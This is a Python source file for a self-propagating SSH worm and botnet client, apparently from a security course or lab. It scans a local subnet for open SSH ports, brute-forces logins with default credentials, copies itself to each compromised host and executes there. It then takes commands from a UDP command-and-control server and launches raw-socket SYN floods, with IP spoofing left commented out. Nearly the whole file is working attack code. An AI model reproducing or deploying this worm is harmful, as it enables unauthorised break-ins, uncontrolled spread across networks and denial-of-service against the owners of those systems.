#!/usr/bin/python
"""bot.py

External Dependencies:
    nmap for network mapping
    paramiko for ssh & sftp
"""
# standard lib
import logging
import os
import random
import socket
import stat
import struct
import subprocess
import sys
import threading
import time

# third-party lib
import nmap
import paramiko

# CONSTANTS
MASTER = '192.168.1.10' # C2 server IPv4 address
PORT = 1337
ID = socket.gethostbyname(socket.gethostname())
BOT_FILE_PATH = '/tmp/bot.py'
DELIMITER = '::'
MAX_THREAD = 100 # must be less than max thread limit

# GLOBALS
state = -1 # 0 ready, 1 attacking, 2 enrolled for attack, 3 stop attacking
credentials = [
    ('ubuntu', 'ubuntu'),
    ('pi', 'raspberry'),
    ('admin', 'password'),
    ('cpsc', 'cpsc')
]
logging.basicConfig(level=logging.INFO,
                    format='%(asctime)s PID:%(process)d %(threadName)s %(message)s',
                    datefmt='%H:%M:%S',
                    filename='/tmp/bot.log')
logger = logging.getLogger('')

##################################################################
# WORM
# A simple ssh worm that:
#   1. Uses nmap to scan the local subnet for IP systems which have
#      ssh open on the default port, 22.
#   2. Attempts to gain access by bruteforce with a pre-set list
#      of credentials
#   3. If connected, copy self to the victim and begin execution
#      on the victim
##################################################################
def access_system(host):
    """ Perform a brute force attack against a host system
    @param host: hostname/ip of target system
    @return: tuple of instance of paramiko SSH class, successful username,
             succesful password; None otherwise
    """
    global credentials
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    logger.info('Accessing {}'.format(host))
    for (username, password) in credentials:
        result = try_credentials(host, username, password, ssh)
        if result == 0:
            return (ssh, username, password)
    
    logger.info('Could not access {}'.format(host))
    return None

def get_targets(subnet):
    """ Get list of target systems
    @param subnet: the target subnet; example '192.168.1.1/24'
    @return: list of potential target hosts with default ssh port open, 22
    """
    nm = nmap.PortScanner()
    hosts = []

    nm.scan(subnet, arguments='-p 22 --open')
    hosts = nm.all_hosts()

    targets = []
    for host in hosts:
        if nm[host].state() == 'up' and host != MASTER and \
        host != ID and not host.startswith('127.'):
            targets.append(host)

    return targets

def spread(sshclient):
    """ Spread to target victim system and start the bot
    @param sshclient: instance of paramiko SSH class connected to a system
    """
    sftp = sshclient.open_sftp()

    sftp.put(os.path.abspath(sys.argv[0]), BOT_FILE_PATH)
    sftp.chmod(BOT_FILE_PATH, stat.S_IRWXO | stat.S_IRWXG | stat.S_IRWXU)
    sftp.close()

    sshclient.exec_command('python ' + BOT_FILE_PATH)
    #sshclient.exec_command('python3 ' + BOT_FILE_PATH)

def try_credentials(host, username, password, sshclient):
    """ Try connecting to a host with a set of credentials
    @param host: hostname/ip of target system
    @param username: username to try
    @param password: password to try
    @param sshclient: instance of paramiko SSH class
    @return: 0 for success; -1 for socket error;
              1 for wrong credentials, maybe
    """
    try:
        sshclient.connect(host, username=username, password=password)
    except paramiko.AuthenticationException:
        return 1
    except paramiko.SSHException:
        return 1
    except socket.error:
        return -1
    
    return 0

def worm_driver(target):
    """ Driver for the worm
    @param target: ipv4 address of beginning target
    @side-effect: when done, sets bot state to ready
    """
    logger.info('LOADING WORM')
    global state
    state = 1
    targets = get_targets(target + '/24')

    logger.info('worm targets: {}'.format(targets))
    for target in targets:
        sshInfo = access_system(target)

        if sshInfo:
            sftp = sshInfo[0].open_sftp()

            try:
                sftp.get(BOT_FILE_PATH, '/tmp/' + target + '.txt')
                logger.info('{} is a friend'.format(target))
            except IOError:
                logger.info('Infecting {}'.format(target))
                spread(sshInfo[0])
            finally:
                os.remove('/tmp/' + target + '.txt')
                sftp.close()
                sshInfo[0].close()
    
    state = 0
    logger.info('TERMINATING WORM')

##################################################################
# BOT
# Communication is transmitted via UDP
# Messages accepted from C2 server:
#   'ROLL': roll call to check for bot's state
#   'ATCK': launch an attack; see atck_command for more details
#   'STOP': terminate active attacks
# Messages sent to C2 server:
#   'HELO': tells the C2 server that bot is up
#   'REDY': response to 'ROLL' for bot in ready state
#   'BUSY': resposne to 'ROLL' for bot not in ready state
# NOTE: raw sockets & scapy module require root privileges
##################################################################
def atck_command(tokens):
    """ Processes an attack message from the C2 server
    NOTE: remember to check for stopping state in the attacks and
          to reset to ready state when attack ends
    @param tokens: tokenized attack command in the following format:
        ['ATCK', <int for attack type>, <target IPv4 address>]
    @side-effect: sets bot state to attacking
    """
    global state

    if state != 2: # check for enrolled state
        return

    try:
        atck_type = int(tokens[1])
        target = tokens[2]
        state = 1
        logger.info('Starting attack {} on {}'.format(atck_type, target))

        if target == MASTER or target.startswith('127.'):
            state = 0
            return

        if atck_type == 0: # spread the bot, ignores stop command
            worm_driver(target)
        elif atck_type == 1: # syn flood
            syn_flood(target)
    except (ValueError, IndexError):
        return

def hello():
    """ Sends a 'HELO' message to the C2 server every minute
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    while True:
        sock.sendto('HELO', (MASTER, PORT))
        #sock.sendto(bytes('HELO', 'utf-8'), (MASTER, PORT))
        time.sleep(60)

    sock.close()

def process_commands(message):
    """ Processes commands received from the C2 server
    @param message: message from the C2 server
    """
    tokens = message.split(DELIMITER)
    command = tokens[0]

    if command == 'ROLL':
        roll_command()
    elif command == 'ATCK':
        atck_command(tokens)
    elif command == 'STOP':
        stop_command()
    else:
        return

def roll_command():
    """ Sends a 'REDY' message if bot is in ready state, 'BUSY' otherwise
    """
    global state
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    if state == 0:
        state = 2
        sock.sendto('REDY', (MASTER, PORT))
        #sock.sendto(bytes('REDY', 'utf-8'), (MASTER, PORT))
    else:
        sock.sendto('BUSY', (MASTER, PORT))
        #sock.sendto(bytes('BUSY', 'utf-8'), (MASTER, PORT))

    sock.close()

def stop_command():
    """ Terminate any active attacks
    @side- effect: sets bot state to ready
    """
    global state
    state = 3
    time.sleep(5) # should be long enough for attack threads to see stop state
    state = 0

def syn_flood(target):
    """ Perform a syn flood on target system
    @param target: IPv4 of system to attack
    """
    count = 0
    while state == 1 and count < MAX_THREAD:
        count = count + 1
        threading.Thread(target=tcp_syn, args=(target,)).start()
    

def bot_driver():
    """ Driver for the bot
    """
    logger.info('LOADING BOT')
    global state
    threading.Thread(target=hello).start()

    master_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    master_sock.bind(('', PORT))

    state = 0 # bot in ready state
    while True:
        message = master_sock.recv(1024)
        logger.info('Received: {}'.format(message))
        threading.Thread(target=process_commands, args=(message,)).start()

    master_sock.close()

##################################################################
# SYN FLOOD
##################################################################
def calculate_tcp_checksum(message):
    """ Calculate the TCP checksum
    @param message: payload + TCP headers + pseudoheader
    @return: 16-bit TCP checksum value
    """
    cs = 0

    for i in range(0, len(message), 2):
        w = (ord(message[i])<<8 + ord(message[i+1]))
        cs = cs + w

    cs = (cs>>16) + (cs & 0xffff)
    cs = ~cs & 0xffff

    return cs

def create_ip_header(src, dst):
    """ Create the IP header
    @param src: source IPv4 address in binary format
    @param dst: destination IPv4 address in binary format
    @return: IPv4 header
    """
    # IPv4 header fields
    v_ihl = 69 # 0x45; version 4, internet header length 5
    dscp_ecn = 0 # type of service
    total_len = 20 + 20 # length of packet; ip header + tcp header
    ident = random.randint(0, 65535) # identification
    flag_frag = 0 # flag and fragment offset
    ttl = 255 # time to live
    protocol = socket.IPPROTO_TCP # protocol; TCP
    checksum = 0 # checksum value; python fills this out??

    return struct.pack('!BBHHHBBH4s4s', v_ihl, dscp_ecn, total_len,
    ident, flag_frag, ttl, protocol, checksum, src, dst)

def create_tcp_header(src, dst):
    """ Create the TCP header
    @param src: source IPv4 address in binary format
    @param dst: destination IPv4 address in binary format
    @return: TCP header
    """
    # TCP header fields
    src_port = 8008 #random.randint(1024, 65535) # source port, non-privileged
    dest_port = 80 # destination port; http
    seq = 0 # sequence number
    ack = 0 # acknowledgement number
    offset_reserved = 0x50 # data offset and reserved
    flags = 2 # TCP flags; SYN flag = 1
    window = socket.htons(5840) # window size
    checksum = 0 # checksum value
    urg = 0 # urgent pointer
    temp = struct.pack('!HHLLBBHHH', src_port, dest_port, seq, ack,
    offset_reserved, flags, window, checksum, urg)

    # Psuedo header fields
    protocol = socket.IPPROTO_TCP # protocol; TCP
    tcp_len = len(temp) # length of tcp header + payload

    psh = struct.pack('!4s4sHH', src, dst, protocol, tcp_len)

    checksum = calculate_tcp_checksum(psh + temp)

    return struct.pack('!HHLLBBHHH', src_port, dest_port, seq, ack,
    offset_reserved, flags, window, checksum, urg)

def create_tcp_syn_packet(target):
    """ Create the TCP SYN packet
    @param target: IPv4 address
    @return: TCP SYN packet
    """
    '''
    a = random.randint(1,255)
    b = random.randint(1,255)
    c = random.randint(1,255)
    d = random.randint(1,255)
    src_ip = '{}.{}.{}.{}'.format(a, b, c, d) # spoofed ip
    '''
    src_ip = ID

    src = socket.inet_aton(src_ip) # source IP address
    dst = socket.inet_aton(target) # destination IP address

    packet = create_ip_header(src, dst) + create_tcp_header(src, dst)

    return packet

def tcp_syn(target):

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

        while state == 1:
            packet = create_tcp_syn_packet(target)
            for _ in xrange(100):
                if state != 1:
                    break
                sock.sendto(packet, (target , 0))

        sock.close()
    except: # no root privilege
        os.system('nc ' + target + ' 80')


##################################################################
# MAIN DRIVER
# Starts the worm driver and the bot driver
##################################################################
def main():
    """ Main driver for the bot
    """
    global ID

    if ID.startswith('127.'): # maybe in a VM environment
        try:
            import netinfo
            
            ID = netinfo.get_ip('enp0s3')
        except:
            pass

    threading.Thread(target=worm_driver, args=(ID,)).start()
    threading.Thread(target=bot_driver).start()

if __name__ == '__main__':
    main()